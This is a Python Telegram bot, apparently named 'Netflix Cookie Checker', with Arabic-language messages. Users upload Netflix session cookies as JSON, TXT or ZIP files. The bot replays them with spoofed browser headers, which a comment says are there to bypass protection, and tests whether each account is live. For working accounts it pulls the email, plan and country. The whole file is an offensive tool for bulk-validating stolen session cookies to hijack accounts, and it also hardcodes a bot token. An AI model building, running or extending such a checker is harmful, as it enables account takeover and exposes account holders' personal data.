import json
import hashlib
import os
import re
import sys
import time
import requests
import zipfile
import io
from urllib.parse import urlparse
from requests.exceptions import RequestException, ConnectionError
from http.client import RemoteDisconnected
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from threading import Lock
import telebot

# ─────────────────────────────────────────────────────────────────────────────
# Init & Config
# ─────────────────────────────────────────────────────────────────────────────
init()

TELEGRAM_BOT_TOKEN = "8405233850:AAFwPOHSwNtytRfI55RRMrevI1GihzcJrJI"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

BANNER = f"""{Fore.RED}
  _   _       _    __ _ _
 | \\ | | ___| |_ / _| (_)_  __
 |  \\| |/ _ \\ __| |_| | \\ \\/ /
 | |\\  |  __/ |_|  _| | |>  <
 |_| \\_|\\___|\\__|_| |_|_/_/\\_\\
{Fore.YELLOW}    Cookie Checker Bot — Supporting JSON, TXT & ZIP
{Style.RESET_ALL}"""

print(BANNER)

max_retries = 3

# ─────────────────────────────────────────────────────────────────────────────
# Extraction helpers
# ─────────────────────────────────────────────────────────────────────────────

def decode_hex_escapes(s: str) -> str:
    if not s:
        return s
    s = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9A-Fa-f]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s


def extract_info(response_text: str) -> dict:
    patterns = {
        "localizedPlanName": (
            r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,'
            r'\s*"value"\s*:\s*"([^"]+)"'
        ),
        "emailAddress": r'"emailAddress"\s*:\s*"([^"]+)"',
        "countryOfSignup": r'"countryOfSignup"\s*:\s*"([^"]+)"',
    }
    result = {}
    for key, pat in patterns.items():
        m = re.search(pat, response_text)
        result[key] = decode_hex_escapes(m.group(1)) if m else None
    return result


def is_netflix_account_url(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path == "/account"


def is_netflix_browse_url(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    path = parsed.path.rstrip("/").lower()
    return host.endswith("netflix.com") and path.startswith("/browse")


def parse_cookies_content(content_bytes: bytes, filename: str) -> list:
    text = content_bytes.decode('utf-8', errors='ignore').strip()
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return data
    except json.JSONDecodeError:
        pass

    cookies = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies.append({
                "domain": parts[0],
                "flag": parts[1],
                "path": parts[2],
                "secure": parts[3].lower() == 'true',
                "expirationDate": parts[4],
                "name": parts[5],
                "value": parts[6]
            })
    return cookies


# ─────────────────────────────────────────────────────────────────────────────
# Core checker function for a single cookie set
# ─────────────────────────────────────────────────────────────────────────────

def check_single_cookie_data(json_cookies: list, filename: str) -> dict:
    url = "https://www.netflix.com/YourAccount"
    session = requests.Session()
    session.cookies.clear()
    session.trust_env = False

    for cookie in json_cookies:
        if isinstance(cookie, dict) and "name" in cookie and "value" in cookie:
            session.cookies.set(cookie["name"], cookie["value"], domain=cookie.get("domain", ".netflix.com"))

    # إضافة ترويسات متصفح حقيقي لتجاوز الحماية
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "identity",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    })

    attempt = 0
    plan, email, country = "Unknown", "Unknown", "Unknown"
    extra_members = False

    while attempt < max_retries:
        try:
            response = session.get(url, timeout=20, allow_redirects=True)
            print(f"[DEBUG] File: {filename} | Status Code: {response.status_code} | Final URL: {response.url}")
            
            if not is_netflix_account_url(response.url):
                return {"status": False, "reason": f"Redirected to: {response.url}"}

            browse_resp = session.get("https://www.netflix.com/browse", timeout=20, allow_redirects=True)
            if not is_netflix_browse_url(browse_resp.url):
                return {"status": False, "reason": "Browse page check failed"}

            content = response.text
            info = extract_info(content)
            soup = BeautifulSoup(content, "lxml")

            em_resp = session.get("https://www.netflix.com/accountowner/addextramember", allow_redirects=False, timeout=20)
            if em_resp.status_code == 200:
                extra_members = True

            raw_plan = info.get("localizedPlanName")
            if raw_plan:
                plan = raw_plan.replace("miembro\\xa0extra", "(Shared Extra Member)")
            else:
                page_text = soup.get_text()
                for candidate in ("Premium", "Standard", "Basic"):
                    if candidate in page_text:
                        plan = candidate
                        break

            raw_email = info.get("emailAddress")
            if raw_email:
                email = raw_email
            else:
                el = soup.select_one(".account-section-email")
                if el:
                    email = el.text.strip()

            country = info.get("countryOfSignup") or "Unknown"

            return {
                "status": True,
                "plan": plan,
                "email": email,
                "country": country,
                "extra_members": extra_members
            }

        except (RequestException, ConnectionError, RemoteDisconnected) as e:
            print(f"[ERROR] Attempt {attempt+1} failed for {filename}: {str(e)}")
            attempt += 1
            time.sleep(1)

    return {"status": False, "reason": "Max retries reached / Connection error"}


# ─────────────────────────────────────────────────────────────────────────────
# Telegram Bot Handlers
# ─────────────────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(
        message,
        "مرحباً بك! يمكنك إرسال ملفات الكوكيز بصيغة **JSON** أو **TXT**، أو حتى ملف **ZIP** يضم مجموعة من الملفات وسأقوم بفحصها لك دفعة واحدة."
    )


@bot.message_handler(content_types=['document'])
def handle_docs(message):
    file_info = bot.get_file(message.document.file_id)
    file_name = message.document.file_name.lower()

    if not (file_name.endswith('.json') or file_name.endswith('.txt') or file_name.endswith('.zip')):
        bot.reply_to(message, "⚠️ يرجى إرسال ملف بصيغة JSON أو TXT أو ZIP فقط.")
        return

    msg = bot.reply_to(message, "⏳ جاري تحميل الملف ومعالجته، يرجى الانتظار...")

    try:
        downloaded_file = bot.download_file(file_info.file_path)

        if file_name.endswith('.zip'):
            with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                valid_files = [f for f in z.namelist() if f.endswith(('.json', '.txt')) and not f.startswith('__MACOSX/') and not f.startswith('.')]
                
                if not valid_files:
                    bot.edit_message_text("⚠️ الملف المضغوط لا يحتوي على ملفات JSON أو TXT صالحة.", chat_id=message.chat.id, message_id=msg.message_id)
                    return

                bot.edit_message_text(f"⏳ العثور على {len(valid_files)} ملف في الأرشيف، جاري الفحص...", chat_id=message.chat.id, message_id=msg.message_id)

                working_count = 0
                expired_count = 0
                results_text = ""

                for filename in valid_files:
                    with z.open(filename) as f:
                        try:
                            content_bytes = f.read()
                            cookies_data = parse_cookies_content(content_bytes, filename)
                            if not cookies_data:
                                expired_count += 1
                                continue
                            
                            res = check_single_cookie_data(cookies_data, filename)
                            short_name = filename.split('/')[-1]
                            
                            if res["status"]:
                                working_count += 1
                                results_text += f"✅ `{short_name}`\n   - الدولة: `{res['country']}` | الإيميل: `{res['email']}` | الخطة: `{res['plan']}`\n"
                            else:
                                expired_count += 1
                        except Exception:
                            expired_count += 1

                summary = (
                    f"📊 **نتائج فحص الملف المضغوط:**\n\n"
                    f"🟢 شغال: {working_count}\n"
                    f"🔴 منتهي: {expired_count}\n\n"
                    f"{results_text}"
                )

                if len(summary) > 4000:
                    summary = summary[:4000] + "\n...(تم اختصار النتائج للطول)"

                bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="Markdown")

        else:
            cookies_data = parse_cookies_content(downloaded_file, file_name)
            if not cookies_data:
                bot.edit_message_text("⚠️ خطأ: لم يتم العثور على بيانات كوكيز صالحة داخل الملف.", chat_id=message.chat.id, message_id=msg.message_id)
                return

            result = check_single_cookie_data(cookies_data, file_name)

            if result["status"]:
                response_text = (
                    f"✅ **الحساب شغال ونشط!**\n\n"
                    f"🌍 **الدولة:** `{result['country']}`\n"
                    f"📧 **الإيميل:** `{result['email']}`\n"
                    f"📦 **الخطة:** `{result['plan']}`\n"
                    f"👥 **عضو إضافي:** `{'نعم' if result['extra_members'] else 'لا'}`"
                )
            else:
                response_text = (
                    f"❌ **الحساب غير شغال (منتهي الصلاحية)**\n"
                    f"📌 **السبب:** {result['reason']}"
                )

            bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="Markdown")

    except Exception as e:
        bot.edit_message_text(f"⚠️ حدث خطأ أثناء المعالجة: {str(e)}", chat_id=message.chat.id, message_id=msg.message_id)


if __name__ == "__main__":
    print(Fore.GREEN + "[🚀] Telegram Bot is running and waiting for files (JSON, TXT, ZIP)..." + Fore.RESET)
    bot.infinity_polling()
